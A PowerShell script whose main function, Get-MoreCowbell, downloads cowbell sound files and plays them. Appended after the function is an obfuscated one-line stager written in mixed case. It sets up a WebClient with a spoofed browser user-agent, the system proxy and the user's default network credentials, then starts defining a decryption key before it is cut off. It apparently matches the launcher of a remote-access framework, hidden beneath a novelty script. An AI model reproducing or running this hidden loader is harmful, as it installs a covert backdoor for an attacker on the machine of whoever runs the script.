function Get-MoreCowbell
{
	[CmdletBinding()]
	param
	(
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[switch]$Introduction,
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[int]$Repeat = 10,
	
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$CowbellUrl = 'http://emmanuelprot.free.fr/Drums%20kit%20Manu/Cowbell.wav',
	
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$IntroUrl = 'http://www.innervation.com/crap/cowbell.wav'
		
		
	)
	begin {
		$ErrorActionPreference = [System.Management.Automation.ActionPreference]::Stop
	}
	process {
		try
		{
			$sound = new-Object System.Media.SoundPlayer
			$CowBellLoc = "$($env:TEMP)\Cowbell.wav"
			if (-not (Test-Path -Path $CowBellLoc -PathType Leaf))
			{
				Invoke-WebRequest -Uri $CowbellUrl -OutFile $CowBellLoc
			}
			if ($Introduction.IsPresent)
			{
				$IntroLoc = "$($env:TEMP)\CowbellIntro.wav"
				if (-not (Test-Path -Path $IntroLoc -PathType Leaf))
				{
					Invoke-WebRequest -Uri $IntroUrl -OutFile $IntroLoc
				}
				$sound.SoundLocation = $IntroLoc
				$sound.Play()
				sleep 2
			}
			$sound.SoundLocation = $CowBellLoc
			for ($i=0; $i -lt $Repeat; $i++) {
				$sound.Play();
				Start-Sleep -Milliseconds 500
			}
		}
		catch
		{
			Write-Error $_.Exception.Message
		}
	}
}
$Wc=NEW-ObJEct SySTEM.NeT.WebClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEaderS.ADD('User-Agent',$u);$WC.PROxy = [System.Net.WEBREQUesT]::DEfaUltWeBProXy;$wc.PrOxy.CReDeNTialS = [SYStEm.NEt.CredeNtIAlCAcHe]::DeFAuLTNetwORKCRedeNtiALs;$K='X^;CsABJe\lFP2Mx:f=9*5-{/}qG

